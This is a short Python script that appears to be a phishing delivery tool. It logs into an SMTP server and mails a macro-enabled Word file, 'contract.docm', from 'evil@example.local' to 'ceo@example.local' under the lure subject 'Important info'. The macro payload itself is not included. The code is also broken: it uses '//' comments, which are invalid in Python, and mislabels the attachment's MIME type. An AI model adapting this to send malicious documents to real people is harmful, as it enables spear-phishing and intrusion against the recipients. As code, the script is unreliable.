import smtplib
import email
from email import encoders
import os
from email.MIMEMultipart import MIMEMultipart
from email.Utils import COMMASPACE
from email.MIMEBase import MIMEBase
from email.parser import Parser
from email.MIMEImage import MIMEImage
from email.MIMEText import MIMEText
from email.MIMEAudio import MIMEAudio
import mimetypes

// Enter your host address/hostname and port here
smtp_host = 'IP ADDRESS/HOSTNAME'
smtp_port = 587


server = smtplib.SMTP()
server.connect(smtp_host,smtp_port)
server.ehlo()
server.starttls()

// Enter here smtp credentials and sender/recipient addresses, subject etc
server.login('login','password')
msg = email.MIMEMultipart.MIMEMultipart()
msg['From'] = 'evil@example.local';
msg['To'] = 'ceo@example.local';
msg['Subject'] = 'Important info';
msg.attach(MIMEText('Email', 'plain'))

// Enter path to your file with filename, in example docm is located in the same directory as script
filename = 'contract.docm';
f = open(filename,'rb')

part = MIMEBase('application', 'vnd.openxmlformats-officedocument.wordprocessingml.document')
part.set_payload(f.read())

part.add_header('Content-Disposition', 'attachment; filename="%s"' % os.path.basename(filename))
encoders.encode_base64(part)
msg.attach(part)
f.close()

server.sendmail('evil@example.local','ceo@example.local',msg.as_string())
